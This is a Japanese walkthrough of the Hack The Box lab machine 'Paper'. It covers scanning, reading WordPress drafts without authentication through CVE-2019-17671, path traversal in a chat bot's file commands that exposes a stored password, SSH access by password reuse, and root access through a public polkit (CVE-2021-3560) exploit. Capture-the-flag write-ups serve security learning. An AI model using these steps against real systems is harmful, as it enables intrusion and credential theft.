# Paper  
Hack The Box : PaperのWriteupです。

| 作成者 | 難易度 | プラットフォーム |  
|:----:|:-----:|:---------------:|
| secnigma | Easy | Linux |  

### foothold  

まずはnmap  

~~~
┌──(kali㉿kali)-[~/htb/paper]
└─$ nmap -sV -n -Pn -A -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,5555,7777,8008,8065,8080,8443,8888 paper.htb
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-12 11:30 EDT
Nmap scan report for paper.htb (10.129.136.31)
Host is up (0.25s latency).
Not shown: 65 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http    Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.37 seconds
~~~  

80, 443番が開いているのでFirefoxでアクセスする。  

中を見るとTestページしか見当たらない。  
paper.htbや証明書のcommonNameにあるlocalhost.localdomainを指定しても特に見つからない。  

niktoを実行する。  
```$ nikto -host http://paper.htb/```  

x-backend-serverヘッダにoffice.paperが入っている事が分かる。  

FQDNをoffice.paperにしてブラウザでアクセスすると、wordpressのページが見つかる。  

ブログっぽいので中を読んでみると、「Feeling Alone!」というタイトルの記事のコメントに、**下書きの機密情報を消すべきだ**みたいな事が書いてある。  

続いてWPScanを実行する。  
※脆弱性を表示するにはapi tokenが必要(無料で取得可能)なので、\<API-TOKEN>の部分に各自のapi tokenをいれる。  

```
$ wpscan --url http://office.paper/ --api-token <API-TOKEN>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


[+] URL: http://office.paper/ [10.129.73.180]
[+] Started: Tue Jun 14 11:13:51 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |
 | [!] 32 vulnerabilities identified:
 |
省略
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
省略
```  
認証なしで下書きを見る脆弱性(CVE-2019-17671)が存在しており、先ほどのコメントにもあった機密情報を見ることができそうである。  

### user  
footholdステップで見つけた脆弱性(CVE-2019-17671)を用いて、機密情報を探る。  

CVE-2019-17671はurlに下記を追加してアクセスすると認証なしで下書きが見えてしまうとのことである。    
```?static=1&order=desc```  

とりあえず下記をブラウザで開く。  
```http://office.paper/?static=1&order=desc```  

下書きが閲覧可能になったので読み進めると、チャットシステムへの登録リンクが見つかる。  
```http://chat.office.paper/register/8qozr226AhkCHZdyY```  

上記のリンクにアクセスするとロケットチャットの登録画面が表示される。  
とりあえず適当なユーザを作成してログインする。  

generalチャネルがあるのでそこに入ってみると、メンバーのチャットが見つかる。  

業務用のbotがあるみたいなので、botに対してDMで  
```recyclops help```  
と打ってみる。  

すると、(詳細は割愛するが)下記のようなコマンドが利用可能だとわかる。  
- ファイルの中身を表示するコマンド
 ```recyclops file test.txt```  

- どのようなファイルがあるかを表示するコマンド  
 ```recyclops list sale```  

listのコマンドでは内部的にlsを使っていそうなので、"../"を使ってみる。  
```recyclops list ../```  
すると下記の実行結果が得られる。  
```
 Fetching the directory listing of ../
total 32
drwx------ 11 dwight dwight 281 Feb 6 08:09 .
drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
-r-------- 1 dwight dwight 33 Jun 19 04:36 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
```  

とりあえずはbotのlistコマンドとfileコマンドで情報収集ができそうである。  
※user.txtがあるが、botの権限では中身の表示は出来なかった。  

色々漁って見た結果、下記コマンドでrecyclopsのPasswordが得られた。  
```recyclops file ../hubot/.env```  
結果  
```
 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```  

とりあえず得られた認証情報でssh接続可能か試してみる。  
```$ ssh recyclops@paper.htb```  
recyclopsアカウントではログインできなかった。  

チャットを見るとrecyclopsを導入したのはDwightKSchruteというユーザということが分かる。  

パスワードを使いまわしている可能性があるので、このアカウントでも試してみる。  
```$ ssh dwight@paper.htb```  
先ほどのパスワードをいれると、接続できた。  
```
dwight@paper.htb's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
[dwight@paper ~]$ 

```  
user.txtも表示できたので、以上でuserの取得は完了。  

#### root  
とりあえずlinpeas.shを実行する。  
※linpeasが古い場合はアップデートが必要。  

polkit関係の脆弱性(CVE-2021-3560)が表示されるので、googleでPoCを探す。  

下記が使えそうなので、ダウンロードしてCVE-2021-3560.pyを送り込む。
```https://github.com/Almorabea/Polkit-exploit```  

送り込んだものを実行すると、シェルがrootのものになっている。  

以上でrootの取得も完了。  
